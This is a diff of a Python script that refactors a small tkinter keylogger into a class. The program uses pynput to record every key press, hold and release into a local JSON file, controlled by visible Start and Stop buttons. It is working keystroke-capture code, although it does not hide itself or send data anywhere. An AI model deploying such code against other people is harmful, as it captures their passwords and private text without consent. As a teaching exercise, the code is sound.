@@ -1,78 +1,64 @@
-
 import tkinter as tk
-from tkinter import *
+from tkinter import messagebox
 from pynput import keyboard
 import json
+import threading
 
-keys_used = []
-flag = False
-keys = ""
+class KeyloggerGUI:
+    def __init__(self, root):
+        self.root = root
+        self.root.title("Keylogger")
+        self.root.geometry("300x150")
 
-def generate_text_log(key):
-    with open('key_log.txt', "w+") as keys:
-        keys.write(key)
+        self.label = tk.Label(root, text='Click "Start" to begin keylogging.')
+        self.label.pack(pady=10)
 
-def generate_json_file(keys_used):
-    with open('key_log.json', '+wb') as key_log:
-        key_list_bytes = json.dumps(keys_used).encode()
-        key_log.write(key_list_bytes)
+        self.start_button = tk.Button(root, text="Start", command=self.start_keylogger)
+        self.start_button.pack(side=tk.LEFT, padx=10)
 
-def on_press(key):
-    global flag, keys_used, keys
-    if flag == False:
-        keys_used.append(
-            {'Pressed': f'{key}'}
-        )
-        flag = True
+        self.stop_button = tk.Button(root, text="Stop", command=self.stop_keylogger, state=tk.DISABLED)
+        self.stop_button.pack(side=tk.RIGHT, padx=10)
 
-    if flag == True:
-        keys_used.append(
-            {'Held': f'{key}'}
-        )
-    generate_json_file(keys_used)
+        self.listener = None
+        self.keys_used = []
+        self.flag = False
 
+    def start_keylogger(self):
+        self.listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
+        self.listener.start()
+        self.label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'key_log.json'")
+        self.start_button.config(state=tk.DISABLED)
+        self.stop_button.config(state=tk.NORMAL)
 
-def on_release(key):
-    global flag, keys_used, keys
-    keys_used.append(
-        {'Released': f'{key}'}
-    )
+    def stop_keylogger(self):
+        if self.listener:
+            self.listener.stop()
+        self.label.config(text="Keylogger stopped.")
+        self.start_button.config(state=tk.NORMAL)
+        self.stop_button.config(state=tk.DISABLED)
 
-    if flag == True:
-        flag = False
-    generate_json_file(keys_used)
+    def generate_json_file(self):
+        with open('key_log.json', 'w') as key_log:
+            json.dump(self.keys_used, key_log)
 
-    keys = keys + str(key)
-    generate_text_log(str(keys))
+    def on_press(self, key):
+        if not self.flag:
+            self.keys_used.append({'Pressed': f'{key}'})
+            self.flag = True
+        else:
+            self.keys_used.append({'Held': f'{key}'})
+        self.generate_json_file()
 
-def start_keylogger():
-    global listener
-    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-    listener.start()
-    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
-    start_button.config(state='disabled')
-    stop_button.config(state='normal')
+    def on_release(self, key):
+        self.keys_used.append({'Released': f'{key}'})
+        if self.flag:
+            self.flag = False
+        self.generate_json_file()
 
-def stop_keylogger():
-    global listener
-    listener.stop()
-    label.config(text="Keylogger stopped.")
-    start_button.config(state='normal')
-    stop_button.config(state='disabled')
+def main():
+    root = tk.Tk()
+    app = KeyloggerGUI(root)
+    root.mainloop()
 
-root = Tk()
-root.title("Keylogger")
-
-label = Label(root, text='Click "Start" to begin keylogging.')
-label.config(anchor=CENTER)
-label.pack()
-
-start_button = Button(root, text="Start", command=start_keylogger)
-start_button.pack(side=LEFT)
-
-stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
-stop_button.pack(side=RIGHT)
-
-root.geometry("250x250")
-
-root.mainloop()
+if __name__ == "__main__":
+    main()
